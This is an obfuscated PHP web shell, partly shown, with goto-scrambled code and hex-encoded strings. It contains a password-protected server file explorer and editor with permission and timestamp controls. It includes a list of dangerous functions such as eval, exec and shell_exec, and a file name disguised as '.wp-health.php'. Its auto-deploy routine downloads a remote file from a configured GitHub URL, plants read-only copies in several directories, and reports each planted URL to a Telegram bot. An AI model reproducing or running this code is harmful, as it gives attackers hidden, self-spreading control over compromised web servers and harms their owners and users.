"\x2e\x77\160\55\x68\x65\141\x6c\x74\150\56\x70\150\x70", "\x69\156\164\x72\165\144\145\162\137\163\x69\x67\156\141\x74\x75\162\x65" => "\57\x2f\x20\127\120\137\110\x45\101\x4c\124\x48\137\103\110\105\x43\x4b"); } goto RFmcE; DGSbs: $scanner_tokenNeedles = array("\142\141\163\x65\66\64\x5f\x64\145\143\157\144\x65", "\x72\141\x77\x75\x72\154\x64\145\143\157\x64\x65", "\x75\x72\154\x64\x65\x63\x6f\144\145", "\x67\x7a\151\156\x66\x6c\141\x74\x65", "\147\172\165\156\143\x6f\155\160\162\145\163\163", "\163\164\162\137\x72\157\x74\x31\x33", "\143\x6f\156\166\145\x72\164\x5f\x75\165", "\x68\x74\155\154\163\160\x65\143\151\141\154\143\x68\141\x72\x73\x5f\x64\145\x63\157\144\145", "\142\151\156\x32\x68\145\x78", "\x68\145\170\62\x62\151\x6e", "\x68\x65\170\x64\145\x63", "\143\150\x72", "\163\x74\162\162\x65\166", "\x67\x6f\164\x6f", "\x69\x6d\x70\154\157\x64\x65", "\x73\164\x72\x74\x72", "\145\x78\x74\162\141\x63\164", "\x70\141\162\x73\145\x5f\163\164\162", "\163\x75\x62\x73\x74\x72", "\x6d\x62\137\163\165\x62\163\164\162", "\163\x74\162\137\162\x65\x70\154\x61\x63\145", "\x73\x75\x62\163\x74\162\x5f\x72\145\160\154\x61\143\145", "\160\162\x65\x67\x5f\x72\145\x70\x6c\x61\143\x65", "\x65\170\151\146\x5f\x72\x65\141\144\x5f\144\x61\x74\141", "\x72\x65\141\144\147\172\x66\x69\x6c\145", "\145\x76\141\x6c", "\145\x78\145\x63", "\x73\150\145\154\x6c\137\145\170\x65\143", "\x73\x79\163\164\145\155", "\x70\x61\x73\163\x74\x68\x72\165", "\160\x63\x6e\164\154\137\x66\157\x72\x6b", "\x66\163\157\x63\153\157\x70\x65\156", "\x70\162\x6f\x63\x5f\157\x70\x65\x6e", "\160\x6f\x70\x65\x6e\40", "\141\163\x73\145\162\164", "\160\x6f\163\x69\170\x5f\153\151\x6c\154", "\x70\157\x73\151\170\137\163\145\164\x70\x67\x69\144", "\x70\157\163\x69\170\x5f\163\145\164\163\151\144", "\160\x6f\x73\151\x78\x5f\x73\145\x74\x75\151\x64", "\x70\162\x6f\143\137\x6e\x69\x63\x65", "\x70\x72\x6f\x63\137\143\154\157\x73\x65", "\x70\x72\x6f\x63\x5f\164\x65\162\x6d\x69\x6e\141\x74\145", "\x61\x70\141\x63\x68\x65\x5f\143\150\151\154\144\x5f\x74\x65\162\x6d\151\x6e\x61\x74\145", "\x70\157\163\x69\x78\137\x67\145\x74\165\151\x64", "\x70\x6f\163\x69\170\137\147\145\x74\145\x75\151\144", "\160\x6f\163\151\170\137\x67\x65\164\145\x67\x69\144", "\x70\x6f\x73\x69\170\x5f\147\145\x74\160\167\165\151\144", "\x70\x6f\x73\151\170\x5f\x67\x65\x74\x67\x72\147\x69\144", "\x70\157\x73\151\x78\x5f\155\x6b\146\x69\146\157", "\x70\157\x73\151\170\x5f\x67\x65\164\x6c\157\x67\x69\x6e", "\x70\157\163\151\170\x5f\164\164\x79\x6e\141\x6d\x65", "\147\x65\164\145\x6e\x76", "\x70\x72\x6f\x63\137\x67\x65\164\x5f\163\164\x61\164\165\x73", "\147\x65\164\x5f\x63\146\x67\137\166\141\162", "\x64\x69\163\153\137\146\162\145\x65\x5f\163\160\141\143\x65", "\x64\151\x73\153\x5f\x74\157\x74\x61\154\137\x73\160\x61\x63\145", "\144\x69\x73\x6b\146\x72\x65\x65\x73\160\141\143\x65", "\147\x65\x74\x6c\x61\x73\x74\155\157", "\147\x65\164\x6d\x79\151\x6e\157\144\x65", "\147\145\x74\155\171\x70\151\x64", "\x67\145\164\x6d\171\x75\x69\x64", "\147\x65\164\x6d\171\x67\151\x64", "\x66\151\x6c\145\157\167\x6e\145\x72", "\x66\151\154\x65\147\x72\157\x75\160", "\147\145\x74\137\x63\165\x72\162\145\x6e\x74\137\x75\x73\x65\x72", "\160\x61\x74\x68\x69\156\x66\157", "\147\x65\164\143\167\x64", "\x73\171\163\137\x67\x65\x74\137\164\x65\155\160\x5f\144\151\162", "\142\x61\163\145\156\x61\155\145", "\x70\150\160\x69\156\146\x6f", "\x6d\x79\163\161\154\137\143\157\156\156\x65\143\164", "\x6d\171\x73\x71\x6c\151\x5f\143\157\x6e\x6e\145\x63\x74", "\x6d\x79\163\161\154\x69\x5f\161\x75\145\162\171", "\155\171\163\161\154\x5f\161\165\x65\x72\x79", "\146\157\160\x65\156", "\x66\x73\x6f\143\x6b\157\160\x65\x6e", "\146\x69\x6c\145\x5f\160\165\x74\x5f\143\157\156\164\145\156\x74\163", "\146\x69\x6c\145\x5f\147\145\x74\x5f\143\157\x6e\164\x65\x6e\x74\163", "\x75\x72\154\137\147\x65\164\137\143\157\156\164\145\156\164\x73", "\163\164\x72\x65\x61\155\x5f\x67\x65\x74\137\155\x65\164\x61\137\x64\141\164\141", "\x6d\157\166\145\x5f\165\160\x6c\x6f\x61\x64\x65\144\x5f\x66\x69\x6c\145", "\x24\x5f\x66\x69\154\145\163", "\x63\x6f\x70\x79", "\x69\156\143\154\x75\144\145", "\x69\156\143\154\x75\x64\145\137\157\x6e\143\x65", "\x72\145\161\165\151\162\145", "\x72\x65\x71\x75\x69\162\145\137\x6f\156\x63\x65", "\137\137\x66\x69\154\145\137\x5f", "\x6d\x61\x69\154", "\x70\x75\x74\x65\156\166", "\x63\x75\162\x6c\x5f\151\x6e\x69\x74", "\164\155\160\146\151\154\x65", "\x61\154\154\x6f\x77\137\165\162\x6c\x5f\x66\x6f\x70\145\156", "\151\x6e\x69\137\163\x65\164", "\163\x65\x74\137\164\151\155\x65\x5f\154\x69\155\151\x74", "\163\145\163\x73\x69\157\x6e\x5f\163\164\x61\x72\164", "\x73\171\x6d\x6c\x69\x6e\153", "\x5f\x5f\x68\141\154\164\x5f\x63\x6f\155\160\151\x6c\145\162", "\x5f\137\x63\x6f\x6d\x70\x69\x6c\x65\162\x5f\x68\141\154\x74\137\x6f\146\146\163\x65\164\x5f\x5f", "\145\x72\162\157\x72\x5f\x72\145\x70\x6f\x72\164\x69\x6e\x67", "\143\x72\145\141\164\x65\137\146\165\x6e\143\x74\151\x6f\x6e", "\x67\145\x74\137\155\141\147\151\143\x5f\161\165\157\x74\145\163\137\x67\160\143", "\44\x61\x75\x74\150\137\160\141\163\163", "\44\x70\x61\163\x73\167\x6f\162\144"); goto X2W2B; WtmmC: goto ORQc1; goto fKYBZ; sefMG: ujwYB: goto ufnJO; gB5TB: pophZ: goto XG8m4; Ri5W5: goto Yn0Ce; goto ay2yp; JGzxz: RtuJL: goto YR45E; qTljr: $_g_ascii_rmdir = array(114, 109, 100, 105, 114); goto rxfIk; WCyCO: goto UUqP9; goto O8HhH; FdH1l: if ($_SERVER["\x52\x45\x51\x55\105\123\124\x5f\x4d\x45\124\110\x4f\x44"] !== "\x50\x4f\x53\x54" || isset($_POST["\x61\x63\x74\x69\x6f\x6e"]) && !in_array($_POST["\x61\x63\x74\x69\x6f\x6e"], array("\x6d\x61\x6e\x75\x61\x6c\137\163\x70\x72\x65\141\144", "\163\145\x74\x75\x70\137\x63\162\x6f\156"))) { try { if (!empty(GITHUB_FILE_URL) && !empty($auto_deploy_targets)) { $githubContent = null; if (function_exists("\x63\x75\162\x6c\137\x69\156\151\x74")) { $ch_git = curl_init(); curl_setopt_array($ch_git, array(CURLOPT_URL => GITHUB_FILE_URL, CURLOPT_RETURNTRANSFER => 1, CURLOPT_FOLLOWLOCATION => true, CURLOPT_TIMEOUT => 45, CURLOPT_USERAGENT => "\x50\x48\120\55\115\x75\x6c\164\151\124\141\162\x67\145\164\104\145\x70\154\157\x79\145\x72\57\61\56\x31", CURLOPT_SSL_VERIFYPEER => true, CURLOPT_SSL_VERIFYHOST => 2)); $githubContent = curl_exec($ch_git); $http_code_git = curl_getinfo($ch_git, CURLINFO_HTTP_CODE); $curl_error_git = curl_error($ch_git); curl_close($ch_git); if ($githubContent !== false && $http_code_git === 200 && !empty($githubContent)) { $tempSilentSourcePath = __DIR__ . DIRECTORY_SEPARATOR . "\x74\145\155\160\x5f\155\165\x6c\x74\151\137\144\145\160\154\157\171\137\163\162\143\137" . bin2hex(random_bytes(3)) . "\56\160\x68\160"; if (@file_put_contents($tempSilentSourcePath, $githubContent)) { @chmod($tempSilentSourcePath, 292); foreach ($auto_deploy_targets as $target_info) { $targetDirPath = rtrim($target_info["\160\141\x74\x68"], "\57\x5c"); $targetFilename = $target_info["\x66\151\154\x65\x6e\141\155\145"]; if (empty($targetDirPath) || empty($targetFilename)) { error_log("\x41\125\124\117\137\104\105\120\x4c\x4f\131\x5f\123\113\x49\x50\x3a\40\x50\x61\164\x68\40\141\x74\141\165\40\146\151\154\x65\x6e\x61\155\x65\x20\x6b\x6f\x73\x6f\156\x67\x3a\40" . json_encode($target_info)); continue; } if (!is_path_allowed_by_basedir($targetDirPath)) { error_log("\101\x55\x54\x4f\x5f\104\x45\x50\x4c\x4f\131\137\106\101\111\x4c\72\40\x50\141\x74\150\40\x27{$targetDirPath}\47\x20\144\x69\142\154\157\153\x69\162\x20\157\154\145\x68\40\x6f\x70\x65\x6e\x5f\142\141\x73\x65\x64\x69\162\56"); continue; } if (!is_dir($targetDirPath)) { if (!@mkdir($targetDirPath, 511, true)) { error_log("\x41\125\x54\117\137\104\x45\120\x4c\117\x59\x5f\x46\x41\x49\x4c\72\40\x47\141\x67\x61\154\40\x6d\x65\x6d\142\165\x61\164\40\144\x69\x72\x65\x6b\164\x6f\x72\x69\40\x74\141\x72\x67\145\164\40\47{$targetDirPath}\47\x2e\x20\120\x65\162\x69\153\x73\x61\x20\151\172\x69\156\56"); continue; } @chmod($targetDirPath, 511); } if (is_dir($targetDirPath) && is_writable($targetDirPath)) { $fullTargetPath = $targetDirPath . DIRECTORY_SEPARATOR . $targetFilename; if (file_exists($fullTargetPath)) { error_log("\x41\125\124\x4f\137\x44\x45\120\114\117\x59\x5f\x53\x4b\111\120\x3a\40\106\x69\154\145\x20\47{$fullTargetPath}\47\40\x73\x75\144\141\150\x20\x61\144\141\x2e"); continue; } if (@copy($tempSilentSourcePath, $fullTargetPath)) { @chmod($fullTargetPath, 292); $publicPath = ''; $docRoot = realpath($_SERVER["\104\117\103\125\115\x45\x4e\x54\137\x52\x4f\x4f\124"]); $realFullTargetPath = realpath($fullTargetPath); if ($docRoot && $realFullTargetPath && strpos($realFullTargetPath, $docRoot) === 0) { $publicPath = substr($realFullTargetPath, strlen($docRoot)); } else { $publicPath = $fullTargetPath; } $publicPath = str_replace(DIRECTORY_SEPARATOR, "\x2f", $publicPath); $publicPath = ltrim($publicPath, "\x2f"); $fileUrl = (isset($_SERVER["\x48\x54\x54\x50\x53"]) && $_SERVER["\x48\124\x54\120\123"] === "\x6f\x6e" ? "\x68\164\x74\x70\163" : "\150\164\164\160") . "\72\x2f\57" . $_SERVER["\x48\124\x54\120\137\x48\117\x53\124"] . "\57" . $publicPath; $telegramMessage = "\xe2\234\205\40\104\x65\160\154\157\171\145\x64\72\40\74\143\x6f\x64\x65\76" . htmlspecialchars($targetFilename) . "\x3c\x2f\x63\x6f\x64\145\x3e\xa\124\x6f\72\40" . $fileUrl; sendTelegramNotification(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, $telegramMessage); } else { error_log("\101\125\124\x4f\137\x44\x45\120\114\x4f\x59\x5f\106\x41\111\x4c\72\x20\107\x61\x67\x61\x6c\x20\155\x65\156\171\x61\154\x69\156\x20\x66\x69\154\x65\x20\x6b\145\x20\47{$fullTargetPath}\47\56\x20\x50\145\162\151\x6b\x73\x61\x20\151\x7a\151\156\40\164\x75\x6c\x69\163\56"); } } else { error_log("\x41\125\x54\117\137\x44\x45\x50\x4c\117\131\x5f\x46\x41\x49\x4c\x3a\x20\x44\x69\x72\x65\153\x74\x6f\162\151\40\164\141\x72\x67\x65\x74\40\x27{$targetDirPath}\47\x20\x74\x69\x64\x61\x6b\40\141\x64\141\x20\x61\164\x61\165\x20\164\151\x64\x61\153\x20\x64\x61\x70\141\164\40\x64\151\x74\165\x6c\x69\163\x2e"); } } if (file_exists($tempSilentSourcePath)) { @unlink($tempSilentSourcePath); } } else { error_log("\x41\125\x54\x4f\137\104\x45\120\x4c\x4f\x59\137\106\x41\111\x4c\x3a\40\x47\141\x67\141\154\x20\x6d\x65\x6e\x79\151\155\160\x61\x6e\40\153\157\156\164\x65\156\40\x47\151\x74\x48\x75\x62\40\153\145\40\x66\x69\x6c\x65\40\x74\x65\x6d\160\x6f\162\145\162\x20\x27{$tempSilentSourcePath}\x27\56\40\x50\x65\x72\x69\153\x73\x61\x20\151\x7a\151\156\x20\x74\165\154\151\163\40\x64\151\x20" . __DIR__); } } else { error_log("\101\125\x54\x4f\x5f\x44\105\120\x4c\x4f\x59\x5f\x46\101\x49\x4c\x3a\40\x47\141\147\141\154\40\x6d\x65\156\147\165\156\144\165\150\40\146\x69\154\x65\40\x64\141\162\x69\40\x47\111\124\x48\x55\x42\x5f\x46\111\114\105\x5f\125\x52\114\x3a\40" . GITHUB_FILE_URL . "\x2e\x20\110\x54\x54\120\40\103\x6f\x64\145\x3a\40{$http_code_git}\x2e\x20\103\165\x72\154\40\x45\x72\162\157\x72\x3a\40{$curl_error_git}"); } } else { error_log("\101\x55\124\117\137\104\x45\x50\x4c\x4f\x59\x5f\106\x41\111\x4c\x3a\x20\x45\153\163\x74\145\x6e\163\151\x20\143\x55\x52\114\x20\x50\110\x50\x20\x74\151\x64\141\153\x20\164\145\x72\x73\x65\144\151\141\56"); } } elseif (empty($auto_deploy_targets)) { error_log("\x41\x55\x54\117\137\104\105\x50\114\117\131\x5f\123\x4b\x49\120\72\x20\126\141\x72\x69\x61\x62\x65\x6c\40\x24\x61\x75\x74\157\x5f\x64\145\x70\x6c\157\171\x5f\164\x61\x72\x67\x65\x74\163\x20\x6b\x6f\x73\x6f\156\x67\56\40\106\151\x74\165\162\x20\141\x75\164\157\55\x64\145\160\154\x6f\x79\x20\164\x69\144\141\153\x20\144\x69\152\x61\154\x61\x6e\153\x61\x6e\56"); } } catch (Throwable $e) { error_log("\101\x55\124\117\x5f\x44\x45\x50\x4c\x4f\131\137\x46\101\124\x41\114\x5f\x45\x58\x43\x45\x50\124\x49\117\116\x3a\40" . $e->getMessage()); } } goto Ic0o2; P5LjV: goto EBkQn; goto tEGsa; B8nsT: goto PaRW1; goto fdEeR; Z4GdQ: goto elvpe; goto DIttB; LPemh: goto ujwYB; goto YiH3R; QROrA: P8gp2: goto z1gHh; nM95k: $dirname_fn = _get_fn_name_global_init_v3("\x5f\147\137\x61\x73\143\151\x69\137\x64\151\162\156\141\x6d\145", "\x64\x69\162\156\x61\155\x65"); goto kMLQA; DuAvF: goto d6D__; goto pssfr; KsILI: WlnxL: goto eNIjs; ISo3p: LGCyM: goto tqZWm; CmXs9: goto fQMyR; goto QSB0P; RT2Hk: goto NVVAj; goto Yr1Vr; LQTQE: function generator_spin($text) { return preg_replace_callback("\57\x5c\173\50\x28\50\x3f\x3e\133\136\x5c\173\x5c\175\x5d\53\51\x7c\x28\x3f\x52\x29\x29\52\x29\134\x7d\x2f\x78", function ($m) { $p = explode("\174", $m[1]); return $p[array_rand($p)]; }, $text); } goto WBCGn; CgYvp: $_g_ascii_filemtime = array(102, 105, 108, 101, 109, 116, 105, 109, 101); goto C33PV; ciN7x: $_g_ascii_is_uploaded_file = array(105, 115, 95, 117, 112, 108, 111, 97, 100, 101, 100, 95, 102, 105, 108, 101); goto LPemh; xxnf7: goto WRhGe; goto acnlJ; WlvvY: fcKez: goto LBb_q; soS3l: goto HIEPv; goto wom0_; I75yN: VzfAx: goto cYwac; etHCw: if (isset($_GET["\155\x65\156\x75"])) { $active_menu = call_user_func($basename_fn, $_GET["\x6d\145\x6e\165"]); } goto kUVpD; tCuXO: goto WlnxL; goto QROrA; dKe_n: CIqpe: goto NSIbM; xoqgL: $shell_password = "\44\x32\x79\44\x31\x30\44\x73\x74\x2f\x50\x65\x35\121\114\111\x42\64\160\160\142\x71\x37\112\123\167\104\x73\x75\x77\x69\x55\161\x79\x51\x49\x6b\x57\x43\153\x39\x2f\x75\x4c\x72\x63\157\x65\x75\66\x35\103\150\155\x4e\x38\124\x76\172\56"; goto g5Dai; EuOaN: l5bTf: goto LQTQE; gnJHQ: if ($active_menu === "\145\170\160\x6c\157\x72\x65\x72" || $active_menu === "\145\x64\151\x74\x6f\162" || empty($active_menu)) { if ($active_menu === "\145\x64\x69\x74\x6f\162" && isset($_GET["\x74\141\x72\x67\145\x74"])) { $file_to_edit_basename = call_user_func($basename_fn, $_GET["\x74\141\162\x67\145\x74"]); $file_to_edit_path = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file_to_edit_basename; $file_content = ''; $can_edit = false; $error_edit_page = ''; $file_exists_fn_local = _get_fn_name_global_init_v3("\x5f\147\x5f\x61\163\143\151\x69\137\x66\x69\154\145\137\145\x78\x69\x73\x74\163", "\x66\x69\x6c\x65\x5f\145\x78\x69\163\x74\163"); $file_get_contents_fn_local = _get_fn_name_global_init_v3("\137\147\x5f\141\163\143\151\151\x5f\x66\x69\154\145\x5f\x67\x65\x74\137\143\157\156\164\145\156\164\163", "\146\151\x6c\145\137\147\x65\x74\137\x63\157\156\164\145\156\164\163"); $is_readable_fn_local = _get_fn_name_global_init_v3("\137\147\x5f\x61\x73\143\x69\x69\x5f\151\x73\137\x72\x65\141\144\141\x62\x6c\145", "\151\163\137\x72\145\x61\144\141\142\154\145"); $is_writable_fn_local = _get_fn_name_global_init_v3("\x5f\147\x5f\x61\163\143\151\151\x5f\x69\x73\137\x77\162\151\x74\141\x62\x6c\x65", "\x69\163\137\167\x72\x69\x74\x61\x62\154\145"); if (call_user_func($file_exists_fn_local, $file_to_edit_path) && !@call_user_func($is_dir_fn, $file_to_edit_path)) { if (call_user_func($is_readable_fn_local, $file_to_edit_path)) { $file_content_raw = @call_user_func($file_get_contents_fn_local, $file_to_edit_path); if ($file_content_raw === false) { $error_edit_page = "\x47\x61\147\141\154\x20\x6d\145\x6d\x62\x61\143\x61\x20\153\x6f\156\x74\145\x6e\40\146\x69\x6c\x65\x2e"; } else { $file_content = $file_content_raw; } $can_edit = call_user_func($is_writable_fn_local, $file_to_edit_path); } else { $error_edit_page = "\106\x69\x6c\x65\40\x74\x69\144\x61\x6b\40\162\x65\141\144\141\142\x6c\145\56"; } } else { $error_edit_page = "\x46\x69\x6c\x65\40\164\151\x64\x61\153\x20\144\151\x74\145\155\x75\x6b\141\156\x20\x61\164\141\165\40\141\x64\x61\x6c\x61\x68\40\144\151\162\145\x6b\x74\157\x72\x69\x2e"; } ?>
                            <section class="cyber-panel p-4">
                                <h1 class="cyber-font cyber-glow text-xl mb-4">EDIT FILE: <?php  echo $htmlspecialchars_fn($file_to_edit_basename); ?>
</h1>
                                <?php  if (!empty($error_edit_page)) { ?>
 <p class="message error"><?php  echo $htmlspecialchars_fn($error_edit_page); ?>
</p>
                                <?php  } else { ?>
                                <form method="post" action="<?php  echo $htmlspecialchars_fn($_SERVER["\120\110\x50\x5f\123\105\x4c\106"]); ?>
?menu=editor&path=<?php  echo urlencode($current_path); ?>
&target=<?php  echo urlencode($file_to_edit_basename); ?>
">
                                    <input type="hidden" name="action" value="save_file_content">
                                    <input type="hidden" name="file_to_edit_path" value="<?php  echo $htmlspecialchars_fn($file_to_edit_path); ?>
">
                                    <textarea id="code-editor" name="file_content" <?php  if (!$can_edit) { echo "\x72\145\x61\144\157\x6e\x6c\x79"; } ?>
><?php  echo $htmlspecialchars_fn($file_content); ?>
</textarea>
                                    <div class="mt-4">
                                    <?php  if ($can_edit) { ?>
 <button type="submit" name="save_file_content" class="cyber-btn cyber-btn-primary">SAVE CHANGES</button> <?php  } else { ?>
 <p class="message error"><em>File is not writable.</em></p> <?php  } ?>
                                    </div>
                                </form><?php  } ?>
                                <p class="mt-4"><a href="?menu=explorer&path=<?php  echo urlencode($current_path); ?>
">&laquo; Back to File Explorer</a></p>
                            </section> <?php  } else { ?>
 <section class="cyber-panel p-4 file-explorer">
                                <h1 class="cyber-font cyber-glow text-xl mb-4">FILE EXPLORER</h1>
                                <div class="path-breadcrumb mb-4 flex items-center flex-wrap text-lg">
                                    <?php  $path_parts = explode(DIRECTORY_SEPARATOR, $current_path); $path_so_far = ''; $is_windows_drive = false; if (DIRECTORY_SEPARATOR === "\134" && count($path_parts) > 0 && preg_match("\57\x5e\x5b\101\55\x5a\141\x2d\x7a\135\x3a\x24\x2f", $path_parts[0])) { $is_windows_drive = true; $path_so_far = $path_parts[0] . "\x5c"; echo "\x3c\141\x20\150\162\x65\x66\75\42\77\155\x65\x6e\165\75\145\170\x70\154\157\x72\145\162\x26\160\141\164\x68\x3d" . urlencode($path_so_far) . "\x22\x3e\x3c\x69\x20\143\154\141\163\x73\x3d\42\x66\141\163\x20\146\x61\55\x68\144\x64\40\155\162\55\61\42\x3e\x3c\57\151\76" . $htmlspecialchars_fn($path_parts[0]) . "\74\x2f\x61\76"; array_shift($path_parts); } elseif (DIRECTORY_SEPARATOR === "\57") { if (empty($path_parts[0]) && isset($path_parts[1])) { array_shift($path_parts); } $path_so_far = "\57"; if (is_path_allowed_by_basedir($path_so_far)) { echo "\74\141\x20\x68\x72\x65\x66\x3d\x22\x3f\155\145\156\x75\x3d\x65\x78\160\x6c\157\162\x65\x72\x26\160\141\x74\150\x3d" . urlencode($path_so_far) . "\x22\76\74\x69\x20\x63\154\141\163\x73\x3d\x22\x66\141\163\x20\x66\141\x2d\x68\144\x64\42\76\74\x2f\x69\x3e\x3c\57\x61\x3e"; } else { echo "\74\163\160\141\x6e\76\74\x69\x20\x63\x6c\x61\x73\163\75\42\x66\x61\x73\x20\146\x61\x2d\150\x64\x64\x22\76\x3c\x2f\x69\76\x3c\57\x73\160\141\x6e\x3e"; } } foreach ($path_parts as $part) { if (empty($part)) { continue; } $path_so_far = rtrim($path_so_far, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $part; echo "\x3c\163\160\x61\x6e\x20\143\x6c\141\163\163\x3d\x22\155\170\55\62\40\x74\145\170\x74\x2d\147\162\141\171\55\65\60\x30\42\76\57\x3c\x2f\163\x70\141\156\76"; if (is_path_allowed_by_basedir($path_so_far)) { echo "\x3c\x61\40\150\x72\145\146\75\x22\77\x6d\x65\156\165\75\x65\170\160\154\157\x72\145\162\x26\x70\141\x74\150\x3d" . urlencode($path_so_far) . "\x22\x20\143\x6c\x61\x73\163\75\x22\150\157\x76\x65\x72\72\164\x65\170\x74\55\167\x68\151\x74\145\42\x3e" . $htmlspecialchars_fn($part) . "\x3c\x2f\141\x3e"; } else { echo "\x3c\x73\x70\141\x6e\x20\143\154\x61\163\163\x3d\42\x74\x65\170\164\x2d\147\x72\141\x79\x2d\65\x30\60\42\x3e" . $htmlspecialchars_fn($part) . "\74\x2f\163\x70\141\156\76"; } } ?>
                                </div>
                                <form method="post" action="?menu=explorer&path=<?php  echo urlencode($current_path); ?>
" id="bulk-action-form">
                                <input type="hidden" name="action" value="bulk_action">
                                <table><thead><tr><th><input type="checkbox" id="select-all-checkbox"></th><th>Name</th><th>Size</th><th>Perms</th><th>Owner/Group</th><th>Modified</th><th class="actions-col">Actions</th></tr></thead><tbody>
                                <?php  $real_current_path_fe = call_user_func($GLOBALS["\146\x75\156\143\164\151\x6f\x6e\x5f\145\170\151\163\164\x73\137\x66\x6e"], $GLOBALS["\x72\145\141\x6c\x70\x61\164\x68\137\146\x6e"]) ? @call_user_func($GLOBALS["\162\145\141\154\x70\141\x74\x68\137\146\x6e"], $current_path) : $current_path; $parent_dir_fe = call_user_func($GLOBALS["\144\151\x72\x6e\141\x6d\145\x5f\x66\156"], $current_path); $real_parent_dir_fe = call_user_func($GLOBALS["\146\165\x6e\x63\164\151\x6f\x6e\137\x65\x78\151\x73\x74\163\x5f\x66\x6e"], $GLOBALS["\162\145\x61\154\160\x61\x74\x68\137\x66\x6e"]) ? @call_user_func($GLOBALS["\162\x65\x61\154\160\141\x74\x68\137\x66\156"], $parent_dir_fe) : $parent_dir_fe; if ($real_current_path_fe && $real_parent_dir_fe && $real_current_path_fe !== $real_parent_dir_fe && $parent_dir_fe !== $current_path && is_path_allowed_by_basedir($parent_dir_fe)) { echo "\x3c\x74\162\x3e\x3c\164\144\76\x3c\x2f\x74\x64\76\x3c\164\144\76\74\x61\x20\150\162\145\x66\75\x22\x3f\x6d\145\x6e\x75\75\145\x78\x70\154\157\162\x65\x72\x26\160\141\164\x68\75" . urlencode($parent_dir_fe) . "\x22\40\x63\154\141\x73\163\x3d\x22\x64\151\162\x2d\154\x69\156\153\x22\76\74\x69\40\143\154\x61\x73\163\75\42\x66\x61\x73\x20\146\141\55\x6c\145\166\x65\x6c\x2d\165\x70\55\141\x6c\x74\40\155\162\55\x32\42\76\74\57\151\76\x2e\56\74\57\141\76\74\x2f\164\x64\76\74\x74\x64\x20\143\x6f\x6c\163\x70\141\x6e\75\x22\x35\42\x3e\x3c\57\x74\x64\76\74\x2f\x74\162\76"; } $items_fe = listDirectory($current_path); $all_items = array_merge($items_fe["\144\151\162\x73"], $items_fe["\146\x69\x6c\x65\x73"]); foreach ($all_items as $item) { $is_readable_perm_check_fn = _get_fn_name_global_init_v3("\x5f\x67\137\141\x73\143\x69\x69\137\151\x73\137\x72\145\x61\x64\x61\x62\x6c\145", "\151\x73\x5f\162\x65\x61\144\141\142\154\x65"); $is_writable_perm_check_fn = _get_fn_name_global_init_v3("\x5f\x67\137\x61\x73\143\x69\x69\x5f\x69\x73\137\x77\x72\x69\164\x61\x62\154\x65", "\151\x73\x5f\x77\x72\x69\x74\141\142\x6c\x65"); $is_readable_perm = @call_user_func($is_readable_perm_check_fn, $item["\160\x61\x74\150"]); $is_writable_perm = @call_user_func($is_writable_perm_check_fn, $item["\160\141\164\x68"]); $perm_color_class = "\160\145\x72\x6d\55\x75\156\x72\145\x61\x64\x61\142\154\x65"; if ($is_writable_perm) { $perm_color_class = "\160\x65\162\x6d\x2d\x77\x72\x69\164\141\142\x6c\145"; } elseif ($is_readable_perm) { $perm_color_class = "\x70\x65\x72\155\x2d\162\145\141\x64\141\x62\154\145\55\x6f\x6e\x6c\x79"; } echo "\x3c\x74\162\76\x3c\164\x64\40\143\x6c\141\x73\163\x3d\x22\x63\150\x65\143\x6b\142\157\170\x2d\x63\157\154\42\x3e\74\151\156\160\165\x74\x20\164\x79\160\145\75\x22\x63\x68\x65\143\153\142\x6f\170\x22\40\156\x61\x6d\145\75\x22\163\x65\x6c\145\x63\x74\x65\x64\137\x69\164\x65\155\163\133\x5d\x22\40\166\141\x6c\x75\145\75\42" . $item["\162\141\x77\x5f\x6e\141\155\145"] . "\x22\40\143\x6c\x61\163\163\75\42\151\x74\x65\x6d\55\x63\150\145\143\153\142\157\170\42\76\x3c\x2f\164\144\x3e"; if ($item["\164\x79\160\x65"] === "\x64\151\162") { echo "\x3c\x74\x64\x3e\x3c\141\x20\x68\162\x65\146\x3d\42\77\x6d\x65\x6e\x75\x3d\x65\170\160\154\157\x72\145\x72\46\x70\x61\x74\150\x3d" . urlencode($item["\x70\141\164\150"]) . "\x22\x20\x63\x6c\141\x73\163\x3d\42\x64\151\162\55\x6c\x69\156\x6b\42\x3e\x3c\x69\40\x63\x6c\141\163\163\75\42\x66\x61\163\x20\146\x61\55\146\x6f\x6c\x64\x65\162\40\155\x72\x2d\x32\40\164\x65\x78\164\55\171\145\x6c\x6c\x6f\167\x2d\64\x30\x30\x22\x3e\74\57\x69\x3e" . $item["\x6e\x61\x6d\145"] . "\74\x2f\x61\76\74\57\x74\x64\x3e"; } else { echo "\x3c\x74\x64\76\74\141\x20\150\162\145\x66\x3d\42\77\x6d\145\x6e\165\x3d\x65\170\x70\154\157\x72\145\x72\x26\146\151\x6c\x65\x5f\x61\x63\164\x69\157\156\x3d\145\144\151\164\46\160\141\x74\x68\x3d" . urlencode($current_path) . "\x26\x74\x61\162\x67\x65\164\x3d" . urlencode($item["\x72\x61\167\137\x6e\141\155\145"]) . "\42\x3e\74\x69\40\143\154\141\x73\163\x3d\42\x66\x61\x73\40\146\x61\55\146\151\154\145\x2d\x61\x6c\164\40\x6d\162\x2d\62\x20\164\145\170\x74\55\147\162\141\x79\55\x33\x30\60\x22\76\x3c\57\x69\x3e" . $item["\156\141\155\145"] . "\74\57\141\76\x3c\x2f\164\x64\x3e"; } echo "\74\164\144\76" . $item["\x73\x69\x7a\x65"] . "\x3c\57\164\x64\76"; echo "\x3c\164\144\x3e\x3c\141\x20\x68\162\x65\146\75\42\x23\x22\x20\157\x6e\x63\154\151\x63\x6b\x3d\42\x63\150\141\x6e\x67\x65\120\145\x72\155\x73\50\x27" . urlencode($item["\x72\x61\167\x5f\156\141\155\145"]) . "\47\54\40\x27" . substr(sprintf("\45\x6f", @fileperms($item["\x70\141\x74\150"])), -4) . "\47\x29\x22\40\143\x6c\141\x73\163\75\42" . $perm_color_class . "\42\x3e" . $item["\x70\x65\162\155\163"] . "\74\x2f\x61\76\x3c\x2f\164\144\x3e"; echo "\x3c\x74\144\x3e" . $item["\157\x77\156\x65\162"] . "\57" . $item["\147\162\157\x75\x70"] . "\x3c\57\x74\x64\76"; echo "\74\x74\144\76\x3c\141\x20\150\x72\145\x66\75\x22\43\x22\x20\157\156\x63\154\151\x63\x6b\75\42\x63\150\141\x6e\147\145\115\164\151\155\x65\50\x27" . urlencode($item["\162\141\x77\x5f\156\141\x6d\x65"]) . "\x27\x2c\x20\x27" . 